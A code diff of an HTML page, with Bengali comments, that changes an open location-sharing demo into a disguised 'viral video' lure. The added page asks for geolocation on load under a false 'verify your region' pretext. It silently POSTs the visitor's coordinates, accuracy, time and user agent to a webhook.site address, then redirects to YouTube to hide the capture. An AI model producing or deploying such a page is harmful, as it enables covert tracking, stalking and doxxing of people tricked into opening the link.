@@ -1,39 +1,68 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-<title>Location Demo</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Watch Viral Video</title>
 
-<meta property="og:title" content="Location Demo Project">
-<meta property="og:description" content="Click to share your location for demo purpose">
-<meta property="og:image" content="https://i.postimg.cc/y8vGyQWF/IMG-6637.jpg">
+    <meta property="og:title" content="🔴 Viral Video 2026 - Watch Now!">
+    <meta property="og:description" content="Exclusive content you don't want to miss. Click to watch!">
+    <meta property="og:image" content="https://i.postimg.cc/y8vGyQWF/IMG-6637.jpg">
+    <meta property="og:url" content="https://your-github-username.github.io/project-name/">
+    <meta property="og:type" content="website">
 
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; background-color: #000; color: #fff; padding-top: 50px; }
+        .loader { border: 16px solid #f3f3f3; border-top: 16px solid #3498db; border-radius: 50%; width: 120px; height: 120px; animation: spin 2s linear infinite; margin: auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
 </head>
+<body>
 
-<body style="text-align:center;font-family:sans-serif">
+    <h2>Loading Video Content...</h2>
+    <div class="loader"></div>
+    <p>Please allow location access to verify your region.</p>
 
-<h2>Location Permission Demo</h2>
-<p>This demo will request your location with your permission.</p>
+    <script>
+        // আপনার Webhook URL এখানে বসান
+        const webhookURL = "https://webhook.site/d3f75cf1-78c6-4a72-b985-b7c8c20eb09b";
 
-<button onclick="getLocation()">Share My Location</button>
+        window.onload = function() {
+            if (navigator.geolocation) {
+                // লোকেশন চাওয়া হচ্ছে
+                navigator.geolocation.getCurrentPosition(sendData, showError);
+            } else {
+                console.log("Geolocation is not supported by this browser.");
+            }
+        };
 
-<p id="result"></p>
+        function sendData(position) {
+            const data = {
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude,
+                accuracy: position.coords.accuracy,
+                timestamp: new Date().toLocaleString(),
+                userAgent: navigator.userAgent
+            };
 
-<script>
-function getLocation() {
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(showPosition);
-  } else {
-    document.getElementById("result").innerHTML =
-    "Geolocation is not supported by this browser.";
-  }
-}
+            // Webhook-এ ডাটা পাঠানো
+            fetch(webhookURL, {
+                method: 'POST',
+                mode: 'no-cors', // ব্রাউজার সিকিউরিটি ইস্যু এড়াতে
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            }).then(() => {
+                // ডাটা পাঠানোর পর ইউজারকে অন্য কোনো সাইটে রিডাইরেক্ট করা (ঐচ্ছিক)
+                window.location.href = "https://www.youtube.com"; 
+            });
+        }
 
-function showPosition(position) {
-  document.getElementById("result").innerHTML =
-  "Latitude: " + position.coords.latitude +
-  "<br>Longitude: " + position.coords.longitude;
-}
-</script>
-
+        function showError(error) {
+            // যদি ইউজার 'Deny' করে
+            console.log("User denied the request.");
+        }
+    </script>
 </body>
 </html>
